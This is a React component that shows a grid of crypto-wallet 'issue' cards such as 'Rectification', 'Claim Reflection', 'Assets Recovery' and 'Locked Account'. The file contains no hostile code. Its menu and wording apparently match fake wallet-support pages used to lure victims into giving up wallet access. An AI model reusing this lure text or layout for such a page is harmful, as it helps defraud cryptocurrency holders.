import { BsBoxFill, BsShieldLockFill } from 'react-icons/bs';
import { BiMessageError, BiTimeFive } from 'react-icons/bi';
import { GrConnect, GrTransaction } from 'react-icons/gr';
import { PiSwapFill } from 'react-icons/pi';
import { IoMdLogIn } from 'react-icons/io';
import { GiConfirmed } from 'react-icons/gi';
import { FiMoreVertical } from 'react-icons/fi';
import { TbCoinOff } from 'react-icons/tb';
import {
  FaBalanceScaleLeft,
  FaRegListAlt,
  FaUserLock,
  FaWallet,
} from 'react-icons/fa';
import { RiNftFill } from 'react-icons/ri';
import {
  FaArrowTrendUp,
  FaCoins,
  FaCube,
  FaFilterCircleDollar,
  FaMoneyBillTransfer,
} from 'react-icons/fa6';
import { IconType } from 'react-icons';
export default function Selection() {
  return (
    <section>
      <div className='py-20 box'>
        <p className='text-4xl text-white'>Make Your Selection Below</p>
        <br />
        <div className='grid grid-cols-1 gap-5 mt-5 md:grid-cols-2 lg:grid-cols-3'>
          {data.map((_) => (
            <div
              key={_.title}
              className='tracking-wider bg-[#111f36] p-8 rounded-lg'
            >
              {withComp(_.icon)} <p className='my-2 text-white/70'>{_.title}</p>
              <p className='text-xs opacity-60'>{_.sub}</p>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function withComp(Comp: IconType) {
  return <Comp className='text-4xl' />;
}

const data = [
  {
    icon: BsBoxFill,
    title: 'Migration Issues',
    sub: 'Click here for migration related issues',
  },
  {
    icon: BsShieldLockFill,
    title: 'Assets Recovery',
    sub: 'Click here for assets recovery issues',
  },
  {
    icon: FaFilterCircleDollar,
    title: 'Rectification',
    sub: 'Click here to rectify issues',
  },
  {
    icon: FaArrowTrendUp,
    title: 'High Gas Fees',
    sub: 'Click here for gas fee related issues.',
  },
  {
    icon: BiMessageError,
    title: 'Slippage Error',
    sub: 'Click here for slippage related error during trade.',
  },
  {
    icon: FaMoneyBillTransfer,
    title: 'Transaction Error',
    sub: 'Click here for transaction related issues.',
  },
  {
    icon: GrTransaction,
    title: 'Cross Chain Transfer',
    sub: 'Click here for cross chain bridge issues.',
  },
  {
    icon: FaCoins,
    title: 'Staking Issues',
    sub: 'click here for staking related issues.',
  },
  {
    icon: PiSwapFill,
    title: 'Swap/Exchange',
    sub: 'Click here for swap/exchange related issues.',
  },
  {
    icon: GiConfirmed,
    title: 'Claim Reflection',
    sub: 'Click here to claim reflection.',
  },
  {
    icon: GrConnect,
    title: 'Connect to Dapps',
    sub: 'Click here for error while connecting to Dapps',
  },
  {
    icon: IoMdLogIn,
    title: 'Login Issues',
    sub: 'Click here for issues while logging into your wallet.',
  },
  {
    icon: FaCube,
    title: 'Claim Airdrop',
    sub: 'Click here for airdrop related issues.',
  },
  {
    icon: RiNftFill,
    title: 'NFTS Issues',
    sub: 'Click here for NFTs minting/transfer related issues.',
  },
  {
    icon: FaBalanceScaleLeft,
    title: 'Missing/Irregular Balance',
    sub: 'Click here to recover lost/missing funds.',
  },
  {
    icon: FaRegListAlt,
    title: 'Whitelist Issues',
    sub: 'Click here for whitelist related issues.',
  },
  {
    icon: BiTimeFive,
    title: 'Transaction Delay',
    sub: 'Click here for any issues related to transaction delayed.',
  },
  {
    icon: FaUserLock,
    title: 'Locked Account',
    sub: 'Click here for issues related to account lock.',
  },
  {
    icon: FaWallet,
    title: 'Trading Wallet Issues',
    sub: 'Click here if you have problem with your trading wallet.',
  },
  {
    icon: TbCoinOff,
    title: 'Unable To Buy Coins/Tokens',
    sub: 'To trade crypto your account must be marked as a trusted payment source.',
  },
  {
    icon: FiMoreVertical,
    title: 'Other Issues Not Listed',
    sub: "If you can't find the issue you are experiencing click here",
  },
];
